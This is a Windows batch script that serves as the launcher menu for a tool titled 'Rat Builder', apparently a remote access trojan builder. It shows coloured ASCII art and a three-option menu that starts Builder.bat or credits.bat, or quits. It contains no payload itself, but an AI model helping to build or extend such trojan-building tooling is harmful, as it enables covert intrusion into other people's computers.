@echo off
mode 80, 28
title Rat Builder - Fnoka
chcp 65001 >nul
cd files
:start
cls
echo.
echo.
echo.
ping localhost -n 2 >nul
echo [34m                    ██▀███   ▄▄▄      ▄▄▄█████▓    ▄▄▄▄    █    ██  ██▓ ██▓    ▓█████▄ ▓█████  ██▀███[0m
ping localhost -n 1 >nul
echo [94m                    ▓██ ▒ ██▒▒████▄    ▓  ██▒ ▓▒   ▓█████▄  ██  ▓██▒▓██▒▓██▒    ▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒[0m
ping localhost -n 1 >nul
echo [36m                    ▓██ ░▄█ ▒▒██  ▀█▄  ▒ ▓██░ ▒░   ▒██▒ ▄██▓██  ▒██░▒██▒▒██░    ░██   █▌▒███   ▓██ ░▄█ ▒[0m
ping localhost -n 1 >nul
echo [96m                    ▒██▀▀█▄  ░██▄▄▄▄██ ░ ▓██▓ ░    ▒██░█▀  ▓▓█  ░██░░██░▒██░    ░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄[0m
ping localhost -n 1 >nul
echo [96m                    ░██▓ ▒██▒ ▓█   ▓██▒  ▒██▒ ░    ░▓█  ▀█▓▒▒█████▓ ░██░░██████▒░▒████▓ ░▒████▒░██▓ ▒██▒[0m
ping localhost -n 1 >nul
echo [96m 		    ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░  ▒ ░░      ░▒▓███▀▒░▒▓▒ ▒ ▒ ░▓  ░ ▒░▓  ░ ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░[0m
ping localhost -n 1 >nul
echo [96m 		      ░▒ ░ ▒░  ▒   ▒▒ ░    ░       ▒░▒   ░ ░░▒░ ░ ░  ▒ ░░ ░ ▒  ░ ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░[0m
ping localhost -n 1 >nul
echo [96m 		      ░░   ░   ░   ▒     ░          ░    ░  ░░░ ░ ░  ▒ ░  ░ ░    ░ ░  ░    ░     ░░   ░[0m 
ping localhost -n 1 >nul
echo [96m 		      ░           ░  ░             ░         ░      ░      ░  ░   ░       ░  ░   ░ [0m
ping localhost -n 1 >nul
echo [96m 		      ░                                     ░ [0m
ping localhost -n 1 >nul
echo.
echo.
echo.
echo.
:input
ping localhost -n 1 >nul
echo     [90;1m#═╦═══════»[0m  [92m[Rat Builder][0m [95m[1][0m
ping localhost -n 1 >nul
echo       [90;1m╚═╦══════»[0m  [92m[Credits][0m  [95m[2][0m
ping localhost -n 1 >nul
echo         [90;1m╚═╦═════»[0m  [92m[Quit][0m   [95m[3][0m
echo|set /p=".          [90;1m╚══>[0m"
choice /c 123 >nul
if /I "%errorlevel%" EQU "1" (
  start Builder.bat
  exit
)
if /I "%errorlevel%" EQU "2" (
  start credits.bat
  exit
)
if /I "%errorlevel%" EQU "3" (
  exit
)